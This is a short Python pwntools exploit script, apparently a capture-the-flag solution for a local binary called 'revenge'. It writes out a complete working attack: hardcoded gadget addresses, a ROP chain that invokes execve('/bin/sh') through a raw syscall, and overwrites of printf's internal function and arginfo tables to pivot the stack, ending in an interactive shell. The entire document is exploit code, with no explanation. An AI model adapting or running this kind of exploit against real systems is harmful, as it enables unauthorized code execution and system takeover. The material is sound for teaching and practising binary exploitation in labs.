from pwn import *

p = process('./revenge')

name_addr = 0x00000000006B73E0
pop_rdi = 0x0000000000400525
pop_rsi = 0x00000000004059d6
pop_rdx = 0x0000000000435435
pop_rax = 0x000000000043364c
syscall_addr = 0x000000000045fa15
head_rop = 0x000000000046D935
xchg_rsp = 0x00000000004A1A79
wait_lookup_done = 0x00000000006B78C0
scope_free_list = 0x00000000006B7910
function_table = 0x00000000006b7a28
arginfo_table = 0x00000000006B7AA8

#ROP
payload = p64(head_rop)
payload += p64(pop_rdi) + p64(name_addr + 8*10)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall_addr)
payload += '/bin/sh\x00'

#create payload
payload = payload.ljust(wait_lookup_done - name_addr,'\x90')
payload += p64(xchg_rsp)
payload = payload.ljust(scope_free_list - name_addr,'\x90')
payload += p64(name_addr + 8)
payload = payload.ljust(function_table - name_addr,'\x90')
payload += p64(0x90)       #follow is the modifier_table -- > 0
payload += p64(0)
payload = payload.ljust(arginfo_table - name_addr,'\x90')
payload += p64(name_addr - 0x73*8)

#gdb.attach(p)
p.sendline(payload)

p.interactive()
